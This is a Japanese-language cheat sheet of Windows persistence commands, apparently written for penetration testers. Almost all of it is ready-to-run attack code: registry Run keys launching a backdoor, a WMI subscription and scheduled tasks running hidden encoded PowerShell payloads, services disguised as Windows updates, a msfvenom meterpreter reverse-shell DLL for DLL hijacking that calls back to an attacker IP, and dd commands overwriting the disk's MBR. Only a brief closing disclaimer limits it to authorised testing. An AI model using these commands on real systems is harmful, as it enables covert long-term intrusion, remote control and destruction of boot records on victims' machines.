# Windows Persistence Techniques

## レジストリ永続化

### 自動実行キー
```powershell
# Run キーの追加
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Backdoor" /t REG_SZ /F /D "C:\path\to\backdoor.exe"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Backdoor" /t REG_SZ /F /D "C:\path\to\backdoor.exe"

# RunOnce キーの追加
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /V "Backdoor" /t REG_SZ /F /D "C:\path\to\backdoor.exe"
```

### WMI 永続化
```powershell
# WMI イベントフィルターの作成
$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "UpdateFilter";
    EventNamespace = "root\cimv2";
    QueryLanguage = "WQL";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# WMI イベントコンシューマーの作成
$Command = "powershell.exe -NoP -NonI -W Hidden -Enc <base64-encoded-payload>"
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "UpdateConsumer";
    CommandLineTemplate = $Command
}

# バインディングの作成
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $Filter;
    Consumer = $Consumer
}
```

## スケジュールタスク

### タスクスケジューラ
```powershell
# 新規タスクの作成
schtasks /create /tn "SystemUpdate" /tr "C:\path\to\backdoor.exe" /sc onlogon /ru "System"

# PowerShell を使用したタスク作成
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NonI -Window Hidden -Enc <base64-encoded-payload>"
$Trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "SystemUpdate" -Description "System Update Task"
```

## サービス永続化

### システムサービス
```powershell
# 新規サービスの作成
sc create "UpdateService" binpath= "C:\path\to\backdoor.exe" start= auto
sc description "UpdateService" "Windows Update Service"

# サービスの開始
sc start "UpdateService"
```

## DLL ハイジャック

### DLL 検索順序の悪用
```powershell
# DLL 検索パスの確認
(Get-Command notepad.exe).Path
Process Monitor でDLL読み込みを監視

# 悪意のあるDLLの作成
copy C:\Windows\System32\version.dll C:\path\to\backup\
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f dll > version.dll
```

## ブートキット

### MBR/VBR 改変
```powershell
# MBRの読み取り
dd if=\\.\PhysicalDrive0 of=mbr.bin bs=512 count=1

# MBRの書き込み
dd if=evil-mbr.bin of=\\.\PhysicalDrive0 bs=512 count=1
```

## 注意事項
- これらの技術は、許可された環境でのペネトレーションテストでのみ使用してください
- システムの重要な機能に影響を与える可能性があります
- 実環境での使用は違法となる可能性があります 